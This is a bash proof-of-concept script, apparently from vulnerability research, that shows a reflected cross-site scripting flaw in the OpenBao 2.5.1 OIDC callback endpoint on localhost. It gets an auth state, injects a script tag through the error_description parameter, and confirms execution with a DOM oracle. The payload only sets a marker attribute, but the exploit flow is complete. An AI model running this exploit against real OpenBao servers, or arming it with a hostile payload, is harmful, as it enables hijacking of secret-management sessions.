#!/usr/bin/env bash
set -euo pipefail

# OpenBao 2.5.1 direct-callback reflected-XSS PoC.
# All requests are localhost-only; every request/response is retained below.

BASE_URL='http://127.0.0.1:8200'
REDIRECT_URI="$BASE_URL/ui/vault/auth/oidc/oidc/callback"
CALLBACK_URL="$BASE_URL/v1/auth/oidc/oidc/callback"
EVIDENCE_ROOT='/home/playground/output/attempt_1/evidence'
RUN_ID="$(date -u +%Y%m%dT%H%M%SZ)-$$"
RUN_DIR="$EVIDENCE_ROOT/$RUN_ID"
mkdir -p "$RUN_DIR"

exec > >(tee "$RUN_DIR/result.txt") 2>&1

fail() {
  echo "FAIL: $*"
  echo "Evidence: $RUN_DIR"
  exit 1
}

for command_name in curl jq node; do
  command -v "$command_name" >/dev/null 2>&1 || fail "missing prerequisite: $command_name"
done
node -e "require('jsdom')" >/dev/null 2>&1 || fail 'node jsdom module is unavailable'

health_body="$RUN_DIR/health.body"
health_headers="$RUN_DIR/health.headers"
health_trace="$RUN_DIR/health.trace"
if ! health_status="$(curl -sS --connect-timeout 3 --max-time 10 \
  -D "$health_headers" -o "$health_body" --trace-ascii "$health_trace" \
  -w '%{http_code}' "$BASE_URL/v1/sys/health")"; then
  fail 'OpenBao health endpoint is unavailable'
fi
[[ "$health_status" == '200' ]] || fail "health endpoint returned HTTP $health_status"
version="$(jq -r '.version // empty' "$health_body")"
[[ "$version" == '2.5.1' ]] || fail "expected OpenBao 2.5.1, observed '$version'"
echo "target_version=$version"

get_state() {
  local label="$1"
  local nonce="$2"
  local stem="$RUN_DIR/$label-auth"
  local request_body
  local status

  request_body="$(jq -cn \
    --arg role 'lab-direct' \
    --arg redirect_uri "$REDIRECT_URI" \
    --arg client_nonce "$nonce" \
    '{role: $role, redirect_uri: $redirect_uri, client_nonce: $client_nonce}')"

  if ! status="$(curl -sS --connect-timeout 3 --max-time 15 -X POST \
    "$BASE_URL/v1/auth/oidc/oidc/auth_url" \
    -H 'Content-Type: application/json' \
    --data "$request_body" \
    -D "$stem.headers" -o "$stem.body" --trace-ascii "$stem.trace" \
    -w '%{http_code}')"; then
    fail "$label auth_url request failed"
  fi
  [[ "$status" == '200' ]] || fail "$label auth_url returned HTTP $status"

  local state
  state="$(jq -er '.data.state | select(type == "string" and length > 0)' "$stem.body")" \
    || fail "$label auth_url did not return a state"
  echo "$state"
}

request_callback() {
  local label="$1"
  local state="$2"
  local description="$3"
  local stem="$RUN_DIR/$label-callback"
  local status

  if ! status="$(curl -sS --connect-timeout 3 --max-time 15 -G "$CALLBACK_URL" \
    --data-urlencode "state=$state" \
    --data-urlencode "error_description=$description" \
    -D "$stem.headers" -o "$stem.body" --trace-ascii "$stem.trace" \
    -w '%{http_code}')"; then
    fail "$label callback request failed"
  fi
  [[ "$status" == '400' ]] || fail "$label callback returned HTTP $status, expected 400"
  grep -qi '^Content-Type: text/html' "$stem.headers" \
    || fail "$label callback was not returned as text/html"
}

benign_marker='BENIGN_MARKER'
benign_state="$(get_state benign "poc-$$-benign")"
request_callback benign "$benign_state" "$benign_marker"
grep -Fq -- "$benign_marker" "$RUN_DIR/benign-callback.body" \
  || fail 'benign marker was not present in the callback body'

payload='<script>document.body.setAttribute("data-xss","XSS_MARKER")</script>'
malicious_state="$(get_state malicious "poc-$$-malicious")"
request_callback malicious "$malicious_state" "$payload"

payload_occurrences="$(grep -F -o -- "$payload" "$RUN_DIR/malicious-callback.body" | wc -l || true)"
[[ "$payload_occurrences" == '1' ]] \
  || fail "raw callback body contained payload $payload_occurrences times, expected once"

dom_output="$RUN_DIR/dom-oracle.txt"
if ! node "$(dirname "$0")/verify_dom.js" "$RUN_DIR/malicious-callback.body" >"$dom_output" 2>&1; then
  cat "$dom_output"
  fail 'DOM execution oracle failed'
fi
cat "$dom_output"
grep -Fxq 'body_data_xss=XSS_MARKER' "$dom_output" \
  || fail 'DOM execution oracle output was ambiguous'

cat >"$RUN_DIR/summary.txt" <<EOF
target_version=$version
benign_state=$benign_state
malicious_state=$malicious_state
benign_status=400
malicious_status=400
malicious_content_type=text/html
payload_occurrences=$payload_occurrences
dom_oracle=body_data_xss:XSS_MARKER
EOF

echo 'PASS: attacker-controlled error_description was returned as executable HTML and executed in a same-origin DOM.'
echo "Evidence: $RUN_DIR"
